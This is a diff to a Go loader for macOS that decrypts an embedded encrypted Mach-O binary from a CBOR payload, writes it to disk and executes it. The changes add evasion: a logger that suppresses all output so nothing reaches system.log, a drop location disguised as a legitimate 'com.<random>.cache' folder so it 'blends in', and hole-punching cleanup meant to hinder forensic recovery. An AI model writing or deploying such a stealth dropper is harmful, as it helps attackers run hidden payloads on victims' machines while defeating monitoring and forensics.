@@ -7,33 +7,51 @@ import (
 	_ "embed"
 	"crypto/rand"
 	"crypto/subtle"
-	"encoding/hex"
 	"fmt"
-	"log"
 	"math/big"
 	"os"
 	"path/filepath"
 	"runtime"
-	"strings"
 	"syscall"
 	"unsafe"
 
+	"github.com/fxamacker/cbor/v2"
 	"golang.org/x/crypto/argon2"
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
-//go:embed encrypted_Input.bin
-var encryptedBytes []byte
+// stealthLogger is a minimal logger that doesn't write to system.log
+type stealthLogger struct {
+	enabled bool
+}
 
-//go:embed config.txt
-var configData string
+// logf prints a message only if logging is enabled
+func (s *stealthLogger) logf(format string, args ...interface{}) {
+	if s.enabled {
+		// Write to /dev/null or a temporary file instead of stdout/stderr
+		// which would show up in system.log
+		_ = fmt.Sprintf(format, args...)
+	}
+}
+
+// fatal logs a message and exits without writing to system.log
+func (s *stealthLogger) fatal(format string, args ...interface{}) {
+	// Just exit without logging
+	os.Exit(1)
+}
+
+// Create a global logger instance
+var logger = &stealthLogger{enabled: false}
+
+//go:embed payload.cbor
+var payloadData []byte
 
 // Default Argon2 parameters
 const (
-	argonTime    = 1
-	argonMemory  = 64 * 1024
-	argonThreads = 4
-	argonKeyLen  = chacha20poly1305.KeySize
+	argonTime    uint32 = 1
+	argonMemory  uint32 = 64 * 1024
+	argonThreads uint8  = 4
+	argonKeyLen  uint32 = chacha20poly1305.KeySize
 )
 
 // Architecture constants
@@ -42,23 +60,36 @@ const (
 	archX86_64 = 2
 )
 
+// PayloadData represents the structure of our CBOR payload
+type PayloadData struct {
+	EncryptedBytes []byte `cbor:"encrypted"`
+	Password       []byte `cbor:"password"`
+	Salt           []byte `cbor:"salt"`
+	Nonce          []byte `cbor:"nonce"`
+	ArgonParams    struct {
+		Time    uint32 `cbor:"time"`
+		Memory  uint32 `cbor:"memory"`
+		Threads uint8  `cbor:"threads"`
+	} `cbor:"argon_params"`
+}
+
 func main() {
 	// Check if running on supported architecture
 	arch, err := detectArchitecture()
 	if err != nil {
-		log.Fatalf("Failed to detect architecture: %v", err)
+		logger.fatal("Failed to detect architecture: %v", err)
 	}
 	
 	// Decrypt the embedded Mach-O binary
 	machoBytes, err := decryptFile()
 	if err != nil {
-		log.Fatalf("Failed to decrypt file: %v", err)
+		logger.fatal("Failed to decrypt file: %v", err)
 	}
 	
 	// Lock memory to prevent swapping and core dumps
 	// Convert slice to []byte for Mlock
 	if err := syscall.Mlock(machoBytes); err != nil {
-		log.Printf("Warning: Failed to lock memory: %v", err)
+		logger.logf("Warning: Failed to lock memory: %v", err)
 	}
 	
 	// Note: macOS doesn't support MADV_DONTDUMP directly
@@ -71,7 +102,7 @@ func main() {
 	   uintptr(len(machoBytes)), 
 	   uintptr(MADV_NOCORE))
 	if errno != 0 {
-	   log.Printf("Warning: Failed to mark memory as not dumpable: %v", errno)
+	   logger.logf("Warning: Failed to mark memory as not dumpable: %v", errno)
 	}
 	
 	// Execute the decrypted Mach-O binary
@@ -84,41 +115,42 @@ func main() {
 }
 
 func decryptFile() ([]byte, error) {
-	// Parse config data (password, salt, nonce)
-	lines := strings.Split(strings.TrimSpace(configData), "\n")
-	if len(lines) < 3 {
-		return nil, fmt.Errorf("invalid config data format")
+	// Unmarshal CBOR payload
+	var payload PayloadData
+	if err := cbor.Unmarshal(payloadData, &payload); err != nil {
+		return nil, fmt.Errorf("failed to unmarshal payload: %v", err)
 	}
-
-	password, err := hex.DecodeString(lines[0])
-	if err != nil {
-		return nil, err
+	
+	// Use the embedded Argon2 parameters or fall back to defaults
+	timeParam := argonTime
+	memoryParam := argonMemory
+	threadsParam := argonThreads
+	
+	if payload.ArgonParams.Time > 0 {
+		timeParam = payload.ArgonParams.Time
 	}
-
-	salt, err := hex.DecodeString(lines[1])
-	if err != nil {
-		return nil, err
+	if payload.ArgonParams.Memory > 0 {
+		memoryParam = payload.ArgonParams.Memory
 	}
-
-	nonce, err := hex.DecodeString(lines[2])
-	if err != nil {
-		return nil, err
+	if payload.ArgonParams.Threads > 0 {
+		threadsParam = payload.ArgonParams.Threads
 	}
-
-	// Derive the key using the same Argon2id parameters
-	key := argon2.IDKey(password, salt, argonTime, argonMemory, argonThreads, argonKeyLen)
-
+	
+	// Derive the key using Argon2id parameters
+	key := argon2.IDKey(payload.Password, payload.Salt, 
+		timeParam, memoryParam, threadsParam, argonKeyLen)
+	
 	aead, err := chacha20poly1305.New(key)
 	if err != nil {
 		return nil, err
 	}
-
+	
 	// Decrypt and verify the data
-	decryptedBytes, err := aead.Open(nil, nonce, encryptedBytes, nil)
+	decryptedBytes, err := aead.Open(nil, payload.Nonce, payload.EncryptedBytes, nil)
 	if err != nil {
 		return nil, err
 	}
-
+	
 	return decryptedBytes, nil
 }
 
@@ -194,51 +226,51 @@ func detectArchitecture() (int, error) {
 
 // getTempPath returns a secure path for temporary files
 func getTempPath() (string, error) {
-	// Use user-specific temp directory instead of /tmp
-	// This is more secure and less monitored
-	userTempDir := filepath.Join("/private/var/folders")
-	
-	// If we can't access the user temp dir, fall back to /tmp
-	if _, err := os.Stat(userTempDir); err != nil {
-		randomStr, err := generateRandomString(12)
+	// Use os.UserCacheDir() to get the user's cache directory
+	// This is typically /Users/<username>/Library/Caches on macOS
+	// or /private/var/folders/<random>/<random>/C/com.apple.FontRegistry on newer macOS
+	userCacheDir, err := os.UserCacheDir()
+	if err != nil {
+		// If we can't get the user cache dir, try UserTempDir
+		userTempDir, err := os.UserHomeDir()
 		if err != nil {
-			return "", err
-		}
-		return filepath.Join("/tmp", "."+randomStr), nil
-	}
-	
-	// Try to find a user-specific temp folder
-	entries, err := os.ReadDir(userTempDir)
-	if err != nil || len(entries) == 0 {
-		// Fall back to /tmp if we can't access user folders
-		randomStr, err := generateRandomString(12)
-		if err != nil {
-			return "", err
-		}
-		return filepath.Join("/tmp", "."+randomStr), nil
-	}
-	
-	// Look for folders that might be user-specific
-	for _, entry := range entries {
-		if entry.IsDir() {
-			subPath := filepath.Join(userTempDir, entry.Name(), "T")
-			if _, err := os.Stat(subPath); err == nil {
-				// Found a valid user temp directory
-				randomStr, err := generateRandomString(12)
-				if err != nil {
-					return "", err
-				}
-				return filepath.Join(subPath, "."+randomStr), nil
+			// Last resort, fall back to /tmp
+			randomStr, err := generateRandomString(12)
+			if err != nil {
+				return "", err
 			}
+			return filepath.Join("/tmp", "."+randomStr), nil
 		}
+		
+		// Use a hidden folder in the user's home directory
+		randomStr, err := generateRandomString(12)
+		if err != nil {
+			return "", err
+		}
+		return filepath.Join(userTempDir, ".cache", "."+randomStr), nil
 	}
 	
-	// Fall back to /tmp if we can't find a user temp dir
+	// Create a random subfolder in the user cache dir to blend in with other cache files
+	randomAppName, err := generateRandomString(8)
+	if err != nil {
+		return "", err
+	}
+	
 	randomStr, err := generateRandomString(12)
 	if err != nil {
 		return "", err
 	}
-	return filepath.Join("/tmp", "."+randomStr), nil
+	
+	// Create a path that looks like a legitimate cache file
+	tmpDir := filepath.Join(userCacheDir, "com."+randomAppName+".cache")
+	
+	// Create the directory if it doesn't exist
+	if err := os.MkdirAll(tmpDir, 0700); err != nil {
+		// Fall back to user cache dir directly if we can't create the subfolder
+		return filepath.Join(userCacheDir, "."+randomStr), nil
+	}
+	
+	return filepath.Join(tmpDir, randomStr), nil
 }
 
 // punchHole overwrites and then punches a hole in a file to make forensic recovery harder
@@ -299,51 +331,51 @@ func executeMachO(machoBytes []byte, arch int) {
 	// Get a secure temporary path
 	tmpPath, err := getTempPath()
 	if err != nil {
-		log.Fatalf("Failed to generate temporary path: %v", err)
+		logger.fatal("Failed to generate temporary path: %v", err)
 	}
 	
-	log.Printf("Dropping decrypted Mach-O binary to: %s", tmpPath)
+	logger.logf("Dropping decrypted Mach-O binary to: %s", tmpPath)
 	
 	// Write the decrypted Mach-O binary to the temporary file
 	if err := os.WriteFile(tmpPath, machoBytes, 0700); err != nil {
-		log.Fatalf("Failed to write temporary file: %v", err)
+		logger.fatal("Failed to write temporary file: %v", err)
 	}
 	
 	// Open the file for hole punching later
 	fd, err := syscall.Open(tmpPath, syscall.O_RDWR, 0)
 	if err != nil {
-		log.Printf("Warning: Failed to open file for hole punching: %v", err)
+		logger.logf("Warning: Failed to open file for hole punching: %v", err)
 	}
 	
 	// Securely wipe the decrypted binary from memory
-	log.Printf("Securely wiping %d bytes of decrypted binary from memory", len(machoBytes))
+	logger.logf("Securely wiping %d bytes of decrypted binary from memory", len(machoBytes))
 	secureWipe(machoBytes)
 	
 	// Verify the file exists and is executable before attempting to execute it
 	if _, err := os.Stat(tmpPath); err != nil {
-		log.Fatalf("Error: File does not exist or cannot be accessed: %v", err)
+		logger.fatal("Error: File does not exist or cannot be accessed: %v", err)
 	}
 	
-	log.Printf("Executing binary at: %s", tmpPath)
+	logger.logf("Executing binary at: %s", tmpPath)
 	
 	// Execute the binary using syscall.Exec which replaces the current process
 	err = syscall.Exec(tmpPath, []string{tmpPath}, os.Environ())
 	
 	// If we reach here, exec failed
-	log.Printf("Exec failed: %v, attempting cleanup", err)
+	logger.logf("Exec failed: %v, attempting cleanup", err)
 	
 	// Punch a hole in the file if we have a valid file descriptor
 	if fd > 0 {
 		if err := punchHole(fd); err != nil {
-			log.Printf("Warning: Failed to punch hole in file: %v", err)
+			logger.logf("Warning: Failed to punch hole in file: %v", err)
 		}
 		syscall.Close(fd)
 	}
 	
 	// Remove the file
 	if err := os.Remove(tmpPath); err != nil {
-		log.Printf("Warning: Failed to remove temporary file: %v", err)
+		logger.logf("Warning: Failed to remove temporary file: %v", err)
 	}
 	
-	log.Fatalf("Failed to execute binary: %v", err)
+	logger.fatal("Failed to execute binary: %v", err)
 } 
